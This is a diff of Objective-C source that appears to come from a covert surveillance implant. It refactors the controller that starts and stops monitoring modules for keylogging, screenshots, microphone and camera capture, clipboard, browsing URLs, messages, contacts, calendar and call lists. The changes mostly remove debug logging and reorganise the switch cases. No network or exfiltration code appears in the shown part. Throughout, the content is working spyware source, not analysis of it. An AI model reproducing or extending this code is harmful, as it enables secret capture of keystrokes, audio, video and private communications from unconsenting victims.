     case AGENT_CAM:
       {
-#ifdef DEBUG
-        NSLog(@"Stopping Agent Camera");
-#endif
         RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
       
         if ([agentCamera stop] == FALSE)
@@ -1313,11 +1166,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
             NSLog(@"Error while stopping agent Camera");
 #endif
-          }
-        else
-          {
-            agentConfiguration = [self getConfigForAgent: agentID];
-            [agentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
           }
       
         break;
@@ -1328,20 +1176,15 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       }
     }
   
-  return YES;
+  return TRUE;
 }
 
 - (BOOL)startAgents
 {
   NSAutoreleasePool   *outerPool    = [[NSAutoreleasePool alloc] init];
-  RCSILogManager      *_logManager  = [RCSILogManager sharedInstance];
   
   NSMutableData       *agentCommand;
- 
-#ifdef DEBUG
-  NSLog(@"Start all Agents called");
-#endif
- 
+
   NSMutableDictionary *anObject;
      
   for (anObject in mAgentsList)
@@ -1353,391 +1196,262 @@ extern RCSISharedMemory *mSharedMemoryCommand;
       NSString *status  = [[NSString alloc] initWithString:
                            [anObject objectForKey: @"status"]];
       
-      if ([status isEqualToString: AGENT_ENABLED] == TRUE)
-        {
-          switch (agentID)
-            {
-            case AGENT_SCREENSHOT:
+      if ([status isEqualToString: AGENT_ENABLED] == FALSE)
+        continue;
+
+      switch (agentID)
+      {
+        // External agents 
+        case AGENT_SCREENSHOT:
+          {
+            agentConfiguration = [[anObject objectForKey: @"data"] retain];
+            
+            if ([agentConfiguration isKindOfClass: [NSString class]])
               {
-#ifdef DEBUG
-                NSLog(@"%s: Starting Agent Screenshot", __FUNCTION__);
-#endif
-              
-                agentConfiguration = [[anObject objectForKey: @"data"] retain];
-                
-                if ([agentConfiguration isKindOfClass: [NSString class]])
-                  {
-                    // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config for screenshot not found");
-#endif
-                    break;
-                  }
-                else
-                  {
-                    agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                    
-                    shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                    shMemoryHeader->agentID         = agentID;
-                    shMemoryHeader->direction       = D_TO_AGENT;
-                    shMemoryHeader->command         = AG_START;
-                    shMemoryHeader->commandDataSize = [agentConfiguration length];
-                    
-                    memcpy(shMemoryHeader->commandData, 
-                           [agentConfiguration bytes], 
-                           [agentConfiguration length]);
-#ifdef DEBUG
-                    NSLog(@"%s: Starting remote Screenshot Agent", __FUNCTION__);
-#endif
-                  
-                    if ([mSharedMemory writeMemory: agentCommand
-                                            offset: OFFT_SCREENSHOT
-                                     fromComponent: COMP_CORE])
-                      {
-                        [anObject setObject: AGENT_RUNNING
-                                     forKey: @"status"];
-                      }
-                  
-                    [agentCommand release];
-                  }
-              
+                // Hard error atm, think about default config parameters
                 break;
               }
-            case AGENT_MICROPHONE:
+            else
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Microphone");
-#endif
-                RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
-                agentConfiguration = [[anObject objectForKey: @"data"] retain];
-                
-                if ([agentConfiguration isKindOfClass: [NSString class]])
-                  {
-                    // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config for Mic not found");
-#endif
-                    break;
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_START forKey: @"status"];
-                    agentMicrophone.mAgentConfiguration = anObject;
-                    
-                    [NSThread detachNewThreadSelector: @selector(start)
-                                             toTarget: agentMicrophone
-                                           withObject: nil];
-                  }
-                  
-                break;
-              }
-            case AGENT_URL:
-              {
-#ifdef DEBUG
-                NSLog(@"%s: Starting Agent URL", __FUNCTION__);
-#endif
-                agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                    
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_START;
-                shMemoryHeader->commandDataSize = 0;
-                
-                BOOL success = [_logManager createLog: LOG_URL
-                                          agentHeader: nil
-                                            withLogID: 0];
-                
-                if (success == TRUE)
-                  {
-                    if ([mSharedMemory writeMemory: agentCommand
-                                            offset: OFFT_URL
-                                     fromComponent: COMP_CORE])
-                      {
-#ifdef DEBUG
-                        NSLog(@"%s: Command START sent to Agent URL", __FUNCTION__);
-#endif
-                        [anObject setObject: AGENT_RUNNING
-                                     forKey: @"status"];
-                      }
-                  }
-                else
-                  {
-#ifdef DEBUG
-                    NSLog(@"An error occurred while creating log for Agent URL");
-#endif
-                  }
-                  
-                [agentCommand release];
-                break;
-              }  
-            case AGENT_APPLICATION:
-              {
-#ifdef DEBUG
-                NSLog(@"%s: Starting Agent Application", __FUNCTION__);
-#endif
                 agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                 
                 shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
                 shMemoryHeader->agentID         = agentID;
                 shMemoryHeader->direction       = D_TO_AGENT;
                 shMemoryHeader->command         = AG_START;
-                shMemoryHeader->commandDataSize = 0;
+                shMemoryHeader->commandDataSize = [agentConfiguration length];
                 
-                BOOL success = [_logManager createLog: LOG_APPLICATION
-                                          agentHeader: nil
-                                            withLogID: 0];
-                
-                if (success == TRUE)
+                memcpy(shMemoryHeader->commandData, 
+                       [agentConfiguration bytes], 
+                       [agentConfiguration length]);
+   
+                if ([mSharedMemory writeMemory: agentCommand
+                                        offset: OFFT_SCREENSHOT
+                                 fromComponent: COMP_CORE])
                   {
-                    if ([mSharedMemory writeMemory: agentCommand
-                                            offset: OFFT_APPLICATION
-                                     fromComponent: COMP_CORE])
-                      {
-#ifdef DEBUG
-                        NSLog(@"%s: Command START sent to Agent Application", __FUNCTION__);
-#endif
-                        [anObject setObject: AGENT_RUNNING
-                                     forKey: @"status"];
-                      }
-                  }
-                else
-                  {
-#ifdef DEBUG
-                    NSLog(@"%s: An error occurred while creating log for Agent Application", __FUNCTION__);
-#endif
+                    [anObject setObject: AGENT_RUNNING forKey: @"status"];
                   }
               
                 [agentCommand release];
-                
-                break;
-              }  
-            case AGENT_MESSAGES:
-              {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Messages");
-#endif
-                RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
-                agentConfiguration = [[anObject objectForKey: @"data"] retain];
-                
-                if ([agentConfiguration isKindOfClass: [NSString class]])
-                  {
-                    // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config for Messages not found");
-#endif
-                    break;
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_START forKey: @"status"];
-                    
-                    agentMessages.mAgentConfiguration = anObject;
-                    
-                    [NSThread detachNewThreadSelector: @selector(start)
-                                             toTarget: agentMessages
-                                           withObject: nil];
-                  }
-                  
-                break;
               }
-            case AGENT_ORGANIZER:
+          
+            break;
+          }
+        case AGENT_URL:
+          {
+            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID         = agentID;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_START;
+            shMemoryHeader->commandDataSize = 0;
+            
+            if ([mSharedMemory writeMemory: agentCommand
+                                    offset: OFFT_URL
+                             fromComponent: COMP_CORE])
               {
-                RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
-                RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
-#ifdef DEBUG
-                NSLog(@"Starting Agent AddressBook %x and Calendar %x",
-                      (unsigned int)agentAddress,
-                      (unsigned int)agentCalendar);
-#endif                
-                [anObject setObject: AGENT_START forKey: @"status"];  
-                
-                agentAddress.mAgentConfiguration = anObject;
-                agentCalendar.mAgentConfiguration = anObject;
-                
-                [NSThread detachNewThreadSelector: @selector(start)
-                                         toTarget: agentAddress
-                                       withObject: nil];
-                                           
-                [NSThread detachNewThreadSelector: @selector(start)
-                                         toTarget: agentCalendar
-                                       withObject: nil];
-#ifdef DEBUG
-                NSLog(@"Agent AddressBook and Calendar Started");
-#endif
-                  
-                  
-                break;
+                [anObject setObject: AGENT_RUNNING forKey: @"status"];
               }
-            case AGENT_KEYLOG:
+          
+            [agentCommand release];
+            break;
+          }  
+        case AGENT_KEYLOG:
+          {
+            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID         = agentID;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_START;
+            shMemoryHeader->commandDataSize = 0;
+          
+            if ([mSharedMemory writeMemory: agentCommand
+                                    offset: OFFT_KEYLOG
+                             fromComponent: COMP_CORE])
               {
-#ifdef DEBUG
-                NSLog(@"%s: Starting Agent Keylog", __FUNCTION__);
-#endif
-                
-                agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_START;
-                shMemoryHeader->commandDataSize = 0;
-                
-                BOOL success = [_logManager createLog: LOG_KEYLOG
-                                          agentHeader: nil
-                                            withLogID: 0];
-                
-                if (success == TRUE)
-                  {
-                    if ([mSharedMemory writeMemory: agentCommand
-                                            offset: OFFT_KEYLOG
-                                     fromComponent: COMP_CORE])
-                      {
-#ifdef DEBUG
-                        NSLog(@"%s: Command START sent to Agent Keylog", __FUNCTION__);
-#endif
-                        [anObject setObject: AGENT_RUNNING
-                                     forKey: @"status"];
-                      }
-                    else
-                      {
-#ifdef DEBUG
-                        NSLog(@"Failed while sending START command to Agent Keylog");
-#endif
-                      }
-                  }
-                else
-                  {
-#ifdef DEBUG
-                    NSLog(@"%s: Failed while creating LOG_URL log file", __FUNCTION__);
-#endif
-                  }
-                
-                [agentCommand release];
-                
-                break;
+                [anObject setObject: AGENT_RUNNING forKey: @"status"];
               }
-            case AGENT_CRISIS:
-              {
-#ifdef DEBUG
-                NSLog(@"%s: Starting Agent Crisis", __FUNCTION__);
-#endif
-                gAgentCrisis = YES;
+          
+            [agentCommand release];
+          
+            break;
+          }
+        case AGENT_CLIPBOARD:
+          {
+            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID         = agentID;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_START;
+            shMemoryHeader->commandDataSize = 0;
 
-                RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
-                [infoManager logActionWithDescription: @"Crisis started"];
-                [infoManager release];
-              
+            if ([mSharedMemory writeMemory: agentCommand
+                                    offset: OFFT_CLIPBOARD
+                             fromComponent: COMP_CORE])
+              {
+                [anObject setObject: AGENT_RUNNING forKey: @"status"];
+              }
+          
+            [agentCommand release];
+            break;
+          }
+        case AGENT_APPLICATION:
+          {
+            agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+            
+            shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+            shMemoryHeader->agentID         = agentID;
+            shMemoryHeader->direction       = D_TO_AGENT;
+            shMemoryHeader->command         = AG_START;
+            shMemoryHeader->commandDataSize = 0;
+            
+            if ([mSharedMemory writeMemory: agentCommand
+                                    offset: OFFT_APPLICATION
+                             fromComponent: COMP_CORE])
+              {
+                [anObject setObject: AGENT_RUNNING forKey: @"status"];
+              }
+          
+            [agentCommand release];
+            
+            break;
+          } 
+        // Internal agents (threaded)
+        case AGENT_MICROPHONE:
+          {
+            RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
+            agentConfiguration = [[anObject objectForKey: @"data"] retain];
+            
+            if ([agentConfiguration isKindOfClass: [NSString class]])
+              {
+                // Hard error atm, think about default config parameters
                 break;
               }
-            case AGENT_DEVICE:
+            else
               {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Device");
-#endif
-                RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
-                agentConfiguration = [[anObject objectForKey: @"data"] retain];
-
-                if ([agentConfiguration isKindOfClass: [NSString class]])
-                  {
-                    // Hard error atm, think about default config parameters
-#ifdef DEBUG
-                    NSLog(@"Config for Device not found");
-#endif
-                    break;
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_START forKey: @"status"];
-                    agentDevice->mAgentConfiguration = anObject;
-
-                    [NSThread detachNewThreadSelector: @selector(start)
-                      toTarget: agentDevice
-                      withObject: nil];
-                  }
-                break;
-              }
-            case AGENT_CALL_LIST:
-              {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Call List");
-#endif
-                RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];
-                agentCallList.mAgentConfiguration = anObject;
-
                 [anObject setObject: AGENT_START forKey: @"status"];
-                    
+                agentMicrophone.mAgentConfiguration = anObject;
+              
                 [NSThread detachNewThreadSelector: @selector(start)
-                                         toTarget: agentCallList
+                                         toTarget: agentMicrophone
                                        withObject: nil];
+              }
+            
+            break;
+          }
+        case AGENT_MESSAGES:
+          {
+            RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
+            agentConfiguration = [[anObject objectForKey: @"data"] retain];
+            
+            if ([agentConfiguration isKindOfClass: [NSString class]])
+              {
+                // Hard error atm, think about default config parameters
                 break;
               }
-            case AGENT_CLIPBOARD:
+            else
               {
-#ifdef DEBUG
-                NSLog(@"%s: Starting Agent clipboard", __FUNCTION__);
-#endif
-                agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_START;
-                shMemoryHeader->commandDataSize = 0;
-
-                BOOL success = [_logManager createLog: LOG_CLIPBOARD
-                                          agentHeader: nil
-                                            withLogID: 0];
-
-                if (success == TRUE)
-                  {
-                    if ([mSharedMemory writeMemory: agentCommand
-                        offset: OFFT_CLIPBOARD
-                        fromComponent: COMP_CORE])
-                      {
-#ifdef DEBUG
-                        NSLog(@"%s: Command START sent to Agent clipboard", __FUNCTION__);
-#endif
-                        [anObject setObject: AGENT_RUNNING
-                          forKey: @"status"];
-                      }
-                  }
-                else
-                  {
-#ifdef DEBUG
-                    NSLog(@"An error occurred while creating log for Agent clipboard");
-#endif
-                  }
-
-                [agentCommand release];
-                break;
-              }
-            case AGENT_CAM:
-              {
-#ifdef DEBUG
-                NSLog(@"Starting Agent Camera");
-#endif
-                RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
-              
-                agentConfiguration = [[self getConfigForAgent: agentID] retain];
-              
                 [anObject setObject: AGENT_START forKey: @"status"];
                 
-                agentCamera->mAgentConfiguration = anObject;
-            
+                agentMessages.mAgentConfiguration = anObject;
+                
                 [NSThread detachNewThreadSelector: @selector(start)
-                                         toTarget: agentCamera
+                                         toTarget: agentMessages
                                        withObject: nil];
-               
+              }
+              
+            break;
+          }
+        case AGENT_ORGANIZER:
+          {
+            RCSIAgentAddressBook *agentAddress = [RCSIAgentAddressBook sharedInstance];
+            RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
+        
+            [anObject setObject: AGENT_START forKey: @"status"];  
+            
+            agentAddress.mAgentConfiguration = anObject;
+            agentCalendar.mAgentConfiguration = anObject;
+            
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentAddress
+                                   withObject: nil];
+                                       
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentCalendar
+                                   withObject: nil];                
+              
+            break;
+          }
+        case AGENT_CRISIS:
+          {
+            gAgentCrisis = YES;
+
+            RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
+            [infoManager logActionWithDescription: @"Crisis started"];
+            [infoManager release];
+          
+            break;
+          }
+        case AGENT_DEVICE:
+          {
+            RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
+            agentConfiguration = [[anObject objectForKey: @"data"] retain];
+
+            if ([agentConfiguration isKindOfClass: [NSString class]])
+              {
+                // Hard error atm, think about default config parameters
                 break;
               }
-            default:
-              break;
-            }
+            else
+              {
+                [anObject setObject: AGENT_START forKey: @"status"];
+                
+                agentDevice->mAgentConfiguration = anObject;
+
+                [NSThread detachNewThreadSelector: @selector(start)
+                                         toTarget: agentDevice
+                                       withObject: nil];
+              }
+            break;
+          }
+        case AGENT_CALL_LIST:
+          {
+            RCSIAgentCallList *agentCallList = [RCSIAgentCallList sharedInstance];
             
-          if (agentConfiguration != nil)
-            [agentConfiguration release];
+            agentCallList.mAgentConfiguration = anObject;
+
+            [anObject setObject: AGENT_START forKey: @"status"];
+                
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentCallList
+                                   withObject: nil];
+            break;
+          }
+        case AGENT_CAM:
+          {
+            RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
+          
+            agentConfiguration = [[self getConfigForAgent: agentID] retain];
+          
+            [anObject setObject: AGENT_START forKey: @"status"];
+            
+            agentCamera->mAgentConfiguration = anObject;
+        
+            [NSThread detachNewThreadSelector: @selector(start)
+                                     toTarget: agentCamera
+                                   withObject: nil];
+           
+            break;
+          }
+        default:
+          break;
         }
+          
+        if (agentConfiguration != nil)
+          [agentConfiguration release];
       
       [status release];
       [innerPool release];
@@ -1751,30 +1465,23 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 - (BOOL)stopAgents
 {
   NSAutoreleasePool *outerPool  = [[NSAutoreleasePool alloc] init];
-  RCSILogManager *_logManager   = [RCSILogManager sharedInstance];
+
+  NSMutableDictionary *anAgent;
   
-#ifdef DEBUG
-  NSLog(@"Stop all Agents called");
-#endif
-  
-  NSMutableDictionary *anObject;
-  
-  for (anObject in mAgentsList)
+  for (anAgent in mAgentsList)
     {
       NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
       
-      int agentID = [[anObject objectForKey: @"agentID"] intValue];
-      NSString *status = [[NSString alloc] initWithString: [anObject objectForKey: @"status"]];
+      int agentID = [[anAgent objectForKey: @"agentID"] intValue];
+      NSString *status = [[NSString alloc] initWithString: [anAgent objectForKey: @"status"]];
       
       if ([status isEqualToString: AGENT_RUNNING] == TRUE)
         {
           switch (agentID)
             {
+            // External agents
             case AGENT_SCREENSHOT:
               {
-#ifdef DEBUG        
-                NSLog(@"Stopping Agent Screenshot");
-#endif
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                 
                 shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
@@ -1785,145 +1492,18 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                 
                 if ([mSharedMemory writeMemory: agentCommand
                                         offset: OFFT_SCREENSHOT
-                                 fromComponent: COMP_CORE])
-                  {
-                    [anObject setObject: AGENT_STOP
-                                 forKey: @"status"];
-                  }
-                
-                [agentCommand release];
-                
-                break;
-              }
-            case AGENT_MICROPHONE:
-              {
-#ifdef DEBUG        
-                NSLog(@"Stopping Agent Microphone");
-#endif
-                RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
-                
-                if ([agentMicrophone stop] == FALSE)
-                  {
-#ifdef DEBUG
-                    NSLog(@"Error while stopping agent Microphone");
-#endif
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED
-                                 forKey: @"status"];
-                  }
-                
-                break;
-              }
-            case AGENT_URL:
-              {
-#ifdef DEBUG        
-                NSLog(@"Stopping Agent URL");
-#endif
-                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-                
-                if ([mSharedMemory writeMemory: agentCommand
-                                        offset: OFFT_URL
                                  fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent URL");
-#endif
-                    [anObject setObject: AGENT_STOP
+                    [anAgent setObject: AGENT_STOPPED
                                  forKey: @"status"];
-                                 
-                    [_logManager closeActiveLog: LOG_URL withLogID: 0];
                   }
                 
                 [agentCommand release];
-                
-                break;
-              }
-            case AGENT_APPLICATION:
-              {
-#ifdef DEBUG       
-                NSLog(@"Stopping Agent Application");
-#endif
-                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-                
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-                
-                if ([mSharedMemory writeMemory: agentCommand
-                                        offset: OFFT_APPLICATION
-                                 fromComponent: COMP_CORE] == TRUE)
-                  {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent Application");
-#endif
-                    [anObject setObject: AGENT_STOP
-                                 forKey: @"status"];  
-                                               
-                    [_logManager closeActiveLog: LOG_APPLICATION withLogID: 0];
-
-                  }
-              
-                [agentCommand release];
-              
-                break;
-              }              
-            case AGENT_MESSAGES:
-              {
-#ifdef DEBUG        
-                NSLog(@"Stopping Agent Messages");
-#endif
-                RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
-                
-                if ([agentMessages stop] == FALSE)
-                  {
-#ifdef DEBUG
-                    NSLog(@"Error while stopping agent Messages");
-#endif
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOP
-                                 forKey: @"status"];
-                  }
-                
-                break;
-              }
-            case AGENT_ORGANIZER:
-              {
-#ifdef DEBUG        
-                NSLog(@"Stopping Agent AddressBook and Calendar");
-#endif
-                RCSIAgentAddressBook *agentAddress  = [RCSIAgentAddressBook sharedInstance];
-                RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
-                
-                if ([agentAddress stop] == FALSE ||
-                    [agentCalendar stop] == FALSE)
-                  {
-#ifdef DEBUG
-                    NSLog(@"Error while stopping agent AddressBook/Calendar");
-#endif
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOP
-                                 forKey: @"status"];
-                  }
                 
                 break;
               }
             case AGENT_KEYLOG:
               {
-#ifdef DEBUG        
-                NSLog(@"Stopping Agent Keylog");
-#endif
                 NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
                 
                 shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
@@ -1935,16 +1515,116 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                                         offset: OFFT_KEYLOG
                                  fromComponent: COMP_CORE] == TRUE)
                   {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent Keylog");
-#endif
-                    [anObject setObject: AGENT_STOP
-                                 forKey: @"status"];
-                                 
-                    [_logManager closeActiveLog: LOG_KEYLOG withLogID: 0];
+                    [anAgent setObject: AGENT_STOP forKey: @"status"];
                   }
                 
                 [agentCommand release];
+                
+                break;
+              }
+            case AGENT_CLIPBOARD:
+              {
+                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                
+                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                shMemoryHeader->agentID         = agentID;
+                shMemoryHeader->direction       = D_TO_AGENT;
+                shMemoryHeader->command         = AG_STOP;
+                
+                if ([mSharedMemory writeMemory: agentCommand
+                                        offset: OFFT_CLIPBOARD
+                                 fromComponent: COMP_CORE] == TRUE)
+                  {
+                    [anAgent setObject: AGENT_STOPPED forKey: @"status"];
+                  }
+                
+                [agentCommand release];
+                
+                break;
+              }
+            case AGENT_URL:
+              {
+                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                
+                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                shMemoryHeader->agentID         = agentID;
+                shMemoryHeader->direction       = D_TO_AGENT;
+                shMemoryHeader->command         = AG_STOP;
+                
+                if ([mSharedMemory writeMemory: agentCommand
+                                        offset: OFFT_URL
+                                 fromComponent: COMP_CORE] == TRUE)
+                  {
+                    [anAgent setObject: AGENT_STOPPED forKey: @"status"];
+                  }
+                
+                [agentCommand release];
+                
+                break;
+              }
+            case AGENT_APPLICATION:
+              {
+                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
+                
+                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
+                shMemoryHeader->agentID         = agentID;
+                shMemoryHeader->direction       = D_TO_AGENT;
+                shMemoryHeader->command         = AG_STOP;
+                
+                if ([mSharedMemory writeMemory: agentCommand
+                                        offset: OFFT_APPLICATION
+                                 fromComponent: COMP_CORE] == TRUE)
+                  {
+                    [anAgent setObject: AGENT_STOPPED forKey: @"status"];  
+                  }
+                
+                [agentCommand release];
+                
+                break;
+              } 
+            // Internal agents (threaded)
+            case AGENT_MICROPHONE:
+              {
+                RCSIAgentMicrophone *agentMicrophone = [RCSIAgentMicrophone sharedInstance];
+                
+                if ([agentMicrophone stop] == FALSE)
+                  {
+#ifdef DEBUG
+                    NSLog(@"Error while stopping agent Microphone");
+#endif
+                  }
+                else
+                  {
+                    [anAgent setObject: AGENT_STOPPED forKey: @"status"];
+                  }
+                
+                break;
+              }             
+            case AGENT_MESSAGES:
+              {
+                RCSIAgentMessages *agentMessages = [RCSIAgentMessages sharedInstance];
+                
+                if ([agentMessages stop] == FALSE)
+                  {
+#ifdef DEBUG
+                    NSLog(@"Error while stopping agent Messages");
+#endif
+                  }
+                
+                break;
+              }
+            case AGENT_ORGANIZER:
+              {
+                RCSIAgentAddressBook *agentAddress  = [RCSIAgentAddressBook sharedInstance];
+                RCSIAgentCalendar    *agentCalendar = [RCSIAgentCalendar sharedInstance];
+                
+                if ([agentAddress stop] == FALSE ||
+                    [agentCalendar stop] == FALSE)
+                  {
+#ifdef DEBUG
+                    NSLog(@"Error while stopping agent AddressBook/Calendar");
+#endif
+                  }
                 
                 break;
               }
@@ -1963,9 +1643,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
               }
             case AGENT_DEVICE:
               {
-#ifdef DEBUG        
-                NSLog(@"Stopping Agent Device");
-#endif
                 RCSIAgentDevice *agentDevice = [RCSIAgentDevice sharedInstance];
 
                 if ([agentDevice stop] == FALSE)
@@ -1973,11 +1650,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
                     NSLog(@"Error while stopping agent Device");
 #endif
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED
-                                 forKey: @"status"];
                   }
 
                 break;
@@ -1995,50 +1667,11 @@ extern RCSISharedMemory *mSharedMemoryCommand;
                     NSLog(@"Error while stopping agent Call List");
 #endif
                   }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED
-                                 forKey: @"status"];
-                  }
-
-                break;
-              }
-            case AGENT_CLIPBOARD:
-              {
-#ifdef DEBUG        
-                NSLog(@"Stopping Agent clipboard");
-#endif
-                NSMutableData *agentCommand = [[NSMutableData alloc] initWithLength: sizeof(shMemoryCommand)];
-
-                shMemoryCommand *shMemoryHeader = (shMemoryCommand *)[agentCommand bytes];
-                shMemoryHeader->agentID         = agentID;
-                shMemoryHeader->direction       = D_TO_AGENT;
-                shMemoryHeader->command         = AG_STOP;
-
-                if ([mSharedMemory writeMemory: agentCommand
-                    offset: OFFT_CLIPBOARD
-                    fromComponent: COMP_CORE] == TRUE)
-                  {
-#ifdef DEBUG
-                    NSLog(@"Stop command sent to Agent clipboard");
-#endif
-                  
-                    [anObject setObject: AGENT_STOP
-                                 forKey: @"status"];
-                                 
-                    [_logManager closeActiveLog: LOG_CLIPBOARD 
-                                      withLogID: 0];
-                  }
-
-                [agentCommand release];
 
                 break;
               }
             case AGENT_CAM:
               {
-#ifdef DEBUG
-                NSLog(@"Stopping Agent Camera");
-#endif
                 RCSIAgentCamera *agentCamera = [RCSIAgentCamera sharedInstance];
               
                 if ([agentCamera stop] == FALSE)
@@ -2046,11 +1679,6 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #ifdef DEBUG
                     NSLog(@"Error while stopping agent Camera");
 #endif
-                  }
-                else
-                  {
-                    [anObject setObject: AGENT_STOPPED
-                                 forKey: @"status"];
                   }
               
                 break;
@@ -2077,94 +1705,81 @@ extern RCSISharedMemory *mSharedMemoryCommand;
 #pragma mark Monitors
 #pragma mark -
 
-- (void)eventsMonitor
+- (BOOL)startEvents
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
+
+  id theEvent;
+  int eventPos = 0;
   
-#ifdef DEBUG
-  NSLog(@"eventsMonitor called, starting all the thread monitors");
-#endif
+  RCSIEvents *events = [RCSIEvents sharedInstance];
+  
   NSEnumerator *enumerator = [mEventsList objectEnumerator];
-  id anObject;
   
-  while ((anObject = [enumerator nextObject]))
+  while ((theEvent = [enumerator nextObject]))
